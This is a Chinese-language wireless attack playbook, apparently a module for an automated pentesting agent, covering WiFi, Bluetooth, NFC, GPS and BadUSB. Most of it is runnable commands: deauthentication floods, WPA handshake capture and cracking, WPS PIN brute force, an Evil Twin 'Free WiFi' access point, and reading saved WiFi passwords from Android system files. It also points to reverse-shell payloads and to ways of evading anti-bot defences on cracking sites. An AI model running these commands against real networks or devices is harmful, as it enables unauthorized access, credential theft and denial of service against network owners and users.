# 无线安全模块 (Wireless)

> WiFi/BLE/RFID/GPS/近源攻击 — 无线协议安全
> 环境：airodump-ng✅ aircrack-ng✅ hcitool✅ adb✅ scapy✅

---

## 知识锚点（Playbook + H1 案例）

> 无线攻击多数发生在物理层/数据链路层，但落地的漏洞类型仍可映射到通用 playbook。

### 关联 Playbook

- `references/playbooks/info-disclosure.md` — 无线抓包直接泄露凭据/会话，Evil Twin 中间人捕获的流量走信息泄露分支
- `references/playbooks/unauth-access.md` — 开放 AP、无认证 BLE GATT 服务、默认配对码走未授权访问 playbook
- `references/playbooks/dos.md` — Deauth、蓝牙泛洪、RF 干扰等无线 DoS 套用 DoS playbook 的"无线资源耗尽"分支

### 关联 H1 案例（references/h1-reports/by-weakness/）

- `man-in-the-middle.md` — 无线中间人、Evil Twin、BLE 嗅探重放
- `improper-certificate-validation.md` — TLS 证书校验缺失导致无线流量可被劫持
- `use-of-insufficiently-random-values.md` — 弱随机数导致 WPS PIN、配对码可预测

### Payload / 工具

- WPS PIN 字典 / SSID 列表：任务执行时用 `airodump-ng` 扫描结果即时生成，不依赖预置字典文件
- 工具链：airodump-ng（扫描）→ aircrack-ng（破解）→ hcitool/sdptool（蓝牙）→ scapy（协议构造）→ adb（Android 无线 API）
- 反弹 Shell / 内网 payload：`payloads/network/reverse-shells.md`、`payloads/network/internal-payloads.md`

## 底层原理：无线安全不是"破解密码"，是"控制物理层"

```
无线攻击面：
1. WiFi — 802.11协议：WPA2/WPA3/OPEN/WEP
2. 蓝牙 — BT/BLE：配对/广播/GATT
3. NFC/RFID — 近场通信：门禁卡/公交卡/支付
4. GPS — 定位欺骗：GPS信号模拟
5. 蜂窝 — 2G/3G/4G/5G：IMSI捕获/基站伪造

当前环境(Android + proot)限制：
- WiFi监听模式：需要支持monitor mode的网卡，Android手机通常不支持
- 蓝牙：hcitool可用，但BLE支持有限
- 但ADB + Android API提供独特的无线能力
```

---

## WiFi 安全

### 监听模式准备

```bash
# 检查网卡是否支持监听模式
iw list | grep -A10 "Supported interface modes"
# 如果支持
airmon-ng start wlan0
# 如果不支持（大多数Android手机）→ 使用Android API
adb shell cmd wifi set-wifi-enabled enabled
adb shell cmd wifi start-scan
adb shell cmd wifi list-scan-results
```

### WiFi 扫描与攻击

```bash
# 1. 周围WiFi扫描
airodump-ng wlan0mon

# 2. 抓取握手包
airodump-ng -c {channel} --bssid {BSSID} -w capture wlan0mon
# 同时用aireplay发起deauth
aireplay-ng -0 10 -a {BSSID} wlan0mon

# 3. 破解握手包
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
# 或用hashcat（GPU加速）
hashcat -m 22000 capture.hc22000 rockyou.txt

# 4. WPS PIN攻击
reaver -i wlan0mon -b {BSSID} -vv

# 5. 伪造AP（Evil Twin）
airbase-ng -e "Free WiFi" -c 6 wlan0mon
```

### Android WiFi 操作

```bash
# 用ADB操作WiFi
adb shell cmd wifi list-scan-results
adb shell cmd wifi connect-network "SSID" wpa2 "password"
adb shell dumpsys wifi | grep -A20 "mConfiguredNetworks"

# 获取WiFi密码（需要root）
adb shell cat /data/misc/wifi/WifiConfigStore.xml
adb shell su -c "cat /data/misc/wifi/wpa_supplicant.conf"
```

---

## 蓝牙安全

```bash
# 1. 蓝牙扫描
hcitool scan
hcitool inq

# 2. 设备信息
hcitool info {MAC}
hcitool name {MAC}

# 3. 服务发现
sdptool browse {MAC}

# 4. BLE扫描（Android API）
adb shell am start -a android.bluetooth.adapter.action.REQUEST_ENABLE
adb shell "dumpsys bluetooth_manager | grep -A50 'Bonded devices'"

# 5. 蓝牙攻击
# BlueBorne漏洞检测
# CVE-2017-0781 (Android蓝牙RCE)
# CVE-2017-1000251 (Linux蓝牙栈溢出)
searchsploit bluetooth

# 6. BLE GATT服务枚举
# 用Android BLE扫描器App或ADB
adb shell cmd bluetooth_manager
```

---

## 近源攻击

```bash
# 1. GPS欺骗
# 用Android模拟位置
adb shell appops set com.target.app android:mock_location allow
# 或用SDR硬件（HackRF）
# 本机无SDR，但可以用Android开发者选项中的模拟位置

# 2. NFC/RFID
# Android NFC读取
adb shell dumpsys nfc
# 用Android NFC Tools App

# 3. 键盘注入攻击（BadUSB）
# 用Android作为HID键盘
# 需要支持USB OTG + HID gadget
```

---

## 本机环境速查

```
已安装: airodump-ng✅ aircrack-ng✅ hcitool✅ scapy✅ adb✅
缺失: reaver❌ → apt install reaver
      mdk4❌ → apt install mdk4
      bettercap❌ → 需要完整monitor mode
      hackrf❌ → 需要SDR硬件

Android特有: WiFi API/蓝牙API/NFC/GPS模拟
限制: 无monitor mode网卡(大部分Android手机)
      无SDR硬件
      蓝牙攻击工具有限
```

---

## 反爬钩子

> 无线安全以本地物理层操作为主，通常不涉及 Web 反爬，但仍有边界场景。

- **无线操作本身不触发反爬**：监听模式抓包、蓝牙扫描、NFC 读取都是本地射频操作，没有 WAF/验证码概念
- **Android API 调用有频率限制**：通过 ADB 高频调用 `cmd wifi start-scan` 可能被系统节流，需适当间隔
- **在线字典/Hash 查询可能遇反爬**：将握手包上传到在线 cracking 平台或查询已破解 hash 时，目标站点可能有反爬策略
- **应对策略**：详见 `references/methodology/06-anti-antibot.md`，本地无线操作保持原节奏，仅在线交互时降速